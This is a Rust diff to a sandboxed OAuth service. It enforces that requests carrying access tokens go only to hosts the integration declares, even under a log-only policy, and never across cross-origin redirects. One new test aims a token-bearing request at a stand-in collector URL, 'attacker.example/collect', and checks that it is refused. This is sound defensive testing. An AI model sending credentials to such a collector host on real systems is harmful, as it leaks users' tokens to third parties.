@@ -6,11 +6,15 @@
 //! attaches the access token to requests module code asks it to make, only
 //! to the hosts the integration declares. Requests to the provider's token
 //! endpoint go through the same guarded HTTP client as module requests: the
-//! endpoint is named by a manifest too.
+//! endpoint is named by a manifest too. Every request here carries a
+//! credential, so it is sent with `Enforcement::Always`: refused outside its
+//! hosts even when the engine's `ctx.http` policy only logs, and never
+//! followed across a redirect to another origin.
 
 use lib_sandbox::ModuleRegistry;
 use lib_sandbox::host::{
-    CallScope, HostError, HostExtension, HostFunction, HttpClient, HttpRequest, SettingsClient,
+    CallScope, Enforcement, HostError, HostExtension, HostFunction, HttpClient, HttpRequest,
+    SettingsClient,
 };
 use lib_sandbox::oauth::{OAuthIntegration, StoredOAuthToken, token_setting_key};
 use serde_json::{Map, Value, json};
@@ -184,6 +188,7 @@ impl OAuthService {
             url,
             method,
             opts: Value::Object(opts),
+            enforcement: Enforcement::Always,
         })
     }
 
@@ -244,6 +249,7 @@ impl OAuthService {
                 "headers": { "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json" },
                 "body": body,
             }),
+            enforcement: Enforcement::Always,
         })?;
         let status = response.get("status").and_then(Value::as_i64).unwrap_or(0);
         let answer = response.get("body").cloned().unwrap_or(Value::Null);
@@ -468,9 +474,13 @@ mod tests {
         }
     }
 
+    /// A request's URL, grants, options and enforcement, as `FakeProvider`
+    /// received it.
+    type Sent = (String, HashSet<String>, Value, Enforcement);
+
     /// Answers the token endpoint and the API, recording what it was sent.
     struct FakeProvider {
-        sent: Mutex<Vec<(String, HashSet<String>, Value)>>,
+        sent: Mutex<Vec<Sent>>,
         token_answers: Mutex<Vec<Value>>,
         api_statuses: Mutex<Vec<i64>>,
     }
@@ -481,6 +491,7 @@ mod tests {
                 request.url.to_string(),
                 request.grants.clone(),
                 request.opts.clone(),
+                request.enforcement,
             ));
             if request.url.contains("/api/token") {
                 let body = self.token_answers.lock().unwrap().remove(0);
@@ -491,7 +502,7 @@ mod tests {
         }
     }
 
-    fn service(settings: Arc<Settings>, provider: Arc<FakeProvider>) -> OAuthService {
+    fn service(settings: Arc<Settings>, http: Arc<dyn HttpClient>) -> OAuthService {
         let registry = Arc::new(ModuleRegistry::new());
         registry
             .register_module(
@@ -516,7 +527,7 @@ mod tests {
         let sealed_settings = settings.clone();
         let write_sealed: Arc<SealedWrite> =
             Arc::new(move |module_id, key, value| sealed_settings.set(module_id, key, value));
-        OAuthService::new(registry, settings, write_sealed, provider).with_clock(|| NOW)
+        OAuthService::new(registry, settings, write_sealed, http).with_clock(|| NOW)
     }
 
     fn provider(token_answers: Vec<Value>, api_statuses: Vec<i64>) -> Arc<FakeProvider> {
@@ -585,8 +596,9 @@ mod tests {
             }
         );
         let sent = provider.sent.lock().unwrap();
-        let (url, grants, opts) = &sent[0];
+        let (url, grants, opts, enforcement) = &sent[0];
         assert_eq!(url, "https://accounts.spotify.com/api/token");
+        assert_eq!(enforcement, &Enforcement::Always);
         assert_eq!(
             grants,
             &HashSet::from(["net:accounts.spotify.com".to_string()])
@@ -690,8 +702,9 @@ mod tests {
             .unwrap();
         assert_eq!(response["status"], 200);
         let sent = provider.sent.lock().unwrap();
-        let (_, grants, opts) = &sent[0];
+        let (_, grants, opts, enforcement) = &sent[0];
         assert_eq!(grants, &HashSet::from(["net:api.spotify.com".to_string()]));
+        assert_eq!(enforcement, &Enforcement::Always);
         assert_eq!(opts["headers"], json!({ "Authorization": "Bearer a1" }));
     }
 
@@ -723,7 +736,7 @@ mod tests {
         assert_eq!(token.access_token, "a3");
         assert_eq!(token.refresh_token, Some("r2".to_string()));
         let sent = provider.sent.lock().unwrap();
-        let urls: Vec<&str> = sent.iter().map(|(url, _, _)| url.as_str()).collect();
+        let urls: Vec<&str> = sent.iter().map(|(url, _, _, _)| url.as_str()).collect();
         assert_eq!(
             urls,
             vec![
@@ -766,5 +779,30 @@ mod tests {
             .unwrap_err()
             .contains("declares no OAuth integration")
         );
+    }
+
+    #[tokio::test(flavor = "multi_thread")]
+    async fn a_token_never_goes_to_an_undeclared_host_even_when_the_policy_only_logs() {
+        use crate::services::http_client::{HttpPolicy, HttpPolicyMode, ReqwestHttpClient};
+
+        let token = json!({ "accessToken": "a1", "refreshToken": "r1", "expiresAtMs": NOW + 3_600_000, "scope": [], "clientId": "app", "tokenUrl": "https://accounts.spotify.com/api/token", "hosts": ["api.spotify.com"] });
+        let settings = settings(&[("oauth.spotify", &token.to_string())]);
+        let http = Arc::new(ReqwestHttpClient::new(HttpPolicy {
+            mode: HttpPolicyMode::Log,
+            allow_private: false,
+        }));
+        let svc = service(settings, http);
+        let error = tokio::task::block_in_place(|| {
+            svc.request(
+                "spotify",
+                "spotify",
+                "https://attacker.example/collect",
+                "GET",
+                Value::Null,
+            )
+        })
+        .unwrap_err();
+        assert!(error.starts_with("permission_denied:"), "{error}");
+        assert!(error.contains("attacker.example"), "{error}");
     }
 }
